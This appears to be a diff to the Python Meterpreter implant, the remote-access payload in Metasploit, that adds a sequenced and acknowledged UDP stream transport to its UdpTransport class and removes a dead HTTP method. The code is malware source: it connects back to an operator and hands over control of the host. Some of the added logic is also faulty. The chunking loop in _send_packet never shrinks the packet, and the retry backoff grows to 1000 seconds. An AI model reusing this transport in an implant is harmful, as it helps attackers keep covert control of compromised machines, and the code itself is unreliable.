@@ -774,15 +774,6 @@ class HttpTransport(Transport):
         self._first_packet = None
         self._empty_cnt = 0
 
-    def _activate(self):
-        return True
-        self._first_packet = None
-        packet = self._get_packet()
-        if packet is None:
-            return False
-        self._first_packet = packet
-        return True
-
     def _get_packet(self):
         if self._first_packet:
             packet = self._first_packet
@@ -939,11 +930,14 @@ class TcpTransport(Transport):
         return cls(url, sock)
 
 class UdpTransport(Transport):
+    DGRAM_STREAM_VERSION = 1
     def __init__(self, url, socket=None):
         super(UdpTransport, self).__init__()
         self.url = url
         self.socket = socket
+        self.sequence = None
         self._first_packet = True
+        self._frame_size = 65507
         self._buffer = bytes()
 
     def _activate(self):
@@ -956,6 +950,7 @@ class UdpTransport(Transport):
                 server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
             except (AttributeError, socket.error):
                 server_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            debug_print('binding udp socket')
             server_sock.bind(('', port))
             server_sock.listen(1)
             if not select.select([server_sock], [], [], timeout)[0]:
@@ -971,16 +966,70 @@ class UdpTransport(Transport):
             sock.settimeout(timeout)
             sock.connect((address, port))
             sock.settimeout(None)
+            if not self._synchronize_client(sock, timeout):
+                return False
         self.socket = sock
         self._first_packet = True
         return True
 
+    @staticmethod
+    def _parse_header(header):
+        if len(header) != 4:
+            return None
+        flags, hi_seq, lo_seq = struct.unpack('>BBH', header)
+        parsed = dict(
+            version=(flags & 0xf0) >> 4,
+            psh_flag=(flags & 0b0100) != 0,
+            ack_flag=(flags & 0b0010) != 0,
+            syn_flag=(flags & 0b0001) != 0,
+            sequence=(hi_seq << 16) | lo_seq
+        )
+        return parsed
+
+    def _synchronize_client(self, sock, timeout):
+        debug_print('[*] synchronizing the dgram stream')
+        sequence = random.randint(1, 0xffffff)
+        sock.send(struct.pack('>BI', 0x11, sequence << 8)[:4])
+        if not select.select([sock], [], [], timeout)[0]:
+            debug_print('  failed due to timeout')
+            return False
+        hello = self._parse_header(sock.recv(4))
+        if hello is None:
+            debug_print('  failed due to hello being None')
+            return False
+        if hello['version'] != self.DGRAM_STREAM_VERSION:
+            debug_print('  failed due to bad version')
+            return False
+        if not hello['ack_flag']:
+            debug_print('  failed due to ack flag')
+            return False
+        if hello['sequence'] != sequence:
+            debug_print('  failed due to bad sequence')
+            return False
+        self.sequence = sequence
+        self.communication_last = time.time()
+        debug_print('[+] synchronized the dgram stream')
+        return True
+
     def __recv(self, size):
         if size > len(self._buffer):
-            self._buffer += self.socket.recv(2048)
+            self._buffer += self.__recv_data()
         result = self._buffer[:size]
         self._buffer = self._buffer[size:]
         return result
+
+    def __recv_data(self):
+        frame = self.socket.recv(self._frame_size)
+        if len(frame) < 5:
+            return bytes()
+        header = self._parse_header(frame[:4])
+        if header['version'] != self.DGRAM_STREAM_VERSION:
+            return bytes()
+        if not (header['psh_flag'] and header['sequence'] == (self.sequence + 1)):
+            return bytes()
+        self.sequence += 1
+        self.socket.send(struct.pack('>BI', 0x12, self.sequence << 8)[:4])
+        return frame[4:]
 
     def _get_packet(self):
         first = self._first_packet
@@ -1017,7 +1066,44 @@ class UdpTransport(Transport):
         return packet + rest
 
     def _send_packet(self, packet):
-        self.socket.send(struct.pack('>I', len(packet)) + packet)
+        chunks = []
+        sent = 0
+        data_size = self._frame_size - 4
+        while len(packet) > data_size:
+            chunks.append(packet[:data_size])
+        if packet:
+            chunks.append(packet)
+        for chunk in chunks:
+            success = False
+            for iteration in range(5):
+                success = self.__send(chunk)
+                if success:
+                    sent += len(chunk)
+                    break
+                time.sleep((100.0 ** (iteration + 1.0)) / 1000.0)
+            if not success:
+                raise IOError('failed to send dgram stream data')
+        return sent
+
+    def __send(self, payload):
+        sequence = self.sequence
+        if sequence == 0xffffff:
+            sequence = 1
+        else:
+            sequence += 1
+        header = struct.pack('>BI', 0x14, sequence << 8)[:4]
+        self.socket.send(header + payload)
+        if not select.select([self.socket], [], [], self.communication_timeout)[0]:
+            return False
+        resp = self._parse_header(self.socket.recv(4))
+        if resp['version'] != self.DGRAM_STREAM_VERSION:
+            return False
+        if not resp['ack_flag']:
+            return False
+        if resp['sequence'] != sequence:
+            return False
+        self.sequence = sequence
+        return True
 
     @classmethod
     def from_socket(cls, sock):
@@ -1028,6 +1114,9 @@ class UdpTransport(Transport):
             address, port = sock.getpeername()[:2]
         url += address + ':' + str(port)
         return cls(url, sock)
+
+    def init_dgstream_client(self):
+        return self._synchronize_client(self.socket, self.communication_timeout)
 
 class PythonMeterpreter(object):
     def __init__(self, transport):
@@ -1087,12 +1176,14 @@ class PythonMeterpreter(object):
     def get_packet(self):
         pkt = self.transport.get_packet()
         if pkt is None and self.transport.should_retire:
+            debug_print('[-] get packet failed and transport is set to retire')
             self.transport_change()
         return pkt
 
     def send_packet(self, packet):
         send_succeeded = self.transport.send_packet(packet)
         if not send_succeeded and self.transport.should_retire:
+            debug_print('[-] send packet failed and transport is set to retire')
             self.transport_change()
         return send_succeeded
 
@@ -1492,6 +1583,7 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
     elif s.type == socket.SOCK_DGRAM:
         # PATCH-SETUP-STAGELESS-UDP-SOCKET #
         transport = UdpTransport.from_socket(s)
+        transport.init_dgstream_client()
     else:
         # PATCH-SETUP-STAGELESS-TCP-SOCKET #
         transport = TcpTransport.from_socket(s)
